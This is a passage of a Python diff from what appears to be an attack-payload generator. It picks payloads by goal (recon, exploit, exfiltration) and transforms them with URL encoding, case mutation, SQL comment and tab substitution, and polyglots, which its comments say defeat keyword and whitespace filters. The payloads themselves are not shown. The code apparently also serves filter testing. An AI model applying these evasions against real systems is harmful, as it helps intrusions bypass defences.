+_GOAL_FAMILIES = {
+    "recon": ["recon"],
+    "exploit": ["recon", "exploit"],
+    "exfiltration": ["recon", "exploit", "exfiltration"],
+}
+
+
+def base_payloads(attack_type: str, goal: str) -> list:
+    """Return [(payload_id, raw_payload)] for an attack type, filtered by goal."""
+    bank = BANKS[attack_type]
+    out = []
+    for fam in _GOAL_FAMILIES[goal]:
+        for suffix, payload in bank.get(fam, []):
+            out.append((f"{attack_type}-{fam}-{suffix}", payload))
+    return out
+
+
+# ----------------------------- evasion transforms -----------------------------
+def _encode_url(p: str) -> str:
+    return urllib.parse.quote(p, safe="")
+
+
+def _encode_double(p: str) -> str:
+    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
+
+
+def _mutate_case(p: str) -> str:
+    # Randomised case-swap - defeats naive case-sensitive keyword filters.
+    out = []
+    for c in p:
+        if c.isalpha() and random.random() < 0.5:
+            out.append(c.upper() if c.islower() else c.lower())
+        else:
+            out.append(c)
+    return "".join(out)
+
+
+def _mutate_comment(p: str) -> str:
+    # Inline SQL comments in place of spaces (harmless-looking elsewhere).
+    return p.replace(" ", "/**/")
+
+
+def _mutate_ws(p: str) -> str:
+    # Swap spaces for tabs (whitespace-based filter bypass).
+    return p.replace(" ", "\t")
+
+
+def apply_evasion(payload_id: str, raw_payload: str, evasion: str,
+                  attack_type: str, rng=random):
+    """Return (variant_type, parent_id, transformed_payload).
+
+    variant_type == 'original' means no transform was applied. parent_id links
+    a variant back to its base payload_id (emitted as X-Capture-Parent).
+    """
+    if evasion == "encoded":
+        fn = rng.choice([_encode_url, _encode_double])
+        return "encoded", payload_id, fn(raw_payload)
+    if evasion == "mutated":
+        fn = rng.choice([_mutate_case, _mutate_comment, _mutate_ws])
+        return "mutated", payload_id, fn(raw_payload)
+    if evasion == "polyglot":
+        bank = POLYGLOTS[attack_type]
+        idx = rng.randrange(len(bank))
+        return "polyglot", f"{attack_type}-polyglot-{idx}", bank[idx]
+    return "original", payload_id, raw_payload
+
+
+if __name__ == "__main__":
+    for at in BANKS:
+        n = sum(len(v) for v in BANKS[at].values())
+        reach = {g: len(base_payloads(at, g)) for g in ("recon", "exploit", "exfiltration")}
+        print(f"{at:16s} base_total={n:5d} polyglots={len(POLYGLOTS[at]):3d} "
+              f"| reachable: recon={reach['recon']:4d} "
+              f"exploit={reach['exploit']:5d} exfil={reach['exfiltration']:5d}")
